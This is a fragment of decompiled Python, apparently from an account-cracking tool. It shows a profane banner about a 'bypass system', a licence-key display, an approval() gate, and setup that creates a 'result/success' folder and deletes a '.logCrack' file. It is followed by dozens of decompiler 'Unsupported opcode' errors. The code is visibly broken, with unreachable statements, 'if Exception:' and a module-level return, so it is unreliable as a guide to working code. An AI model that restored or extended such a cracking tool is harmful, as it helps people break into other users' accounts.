    print('\x1b[1;97m[+] FUCK YOUR BYPASS SYSTEM ')
    print('----------------------------------------------------------------------')
    print('\x1b[1;91m[+] Your Key \x1b[1;37m : \x1b[1;32m' + key + '|' + key1)
    print('----------------------------------------------------------------------')
    exit()
    time.sleep(0)
    approval()
    return None
    if Exception:
        x = None
        sys.exit()
        x = None
        del x
        return None
    x = None
    del x

if __name__ == '__main__':
    ses = requests.Session()
    os.mkdir('result')
    os.system('mkdir result/success')
    os.remove('.logCrack')
    approval()
    return None

Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
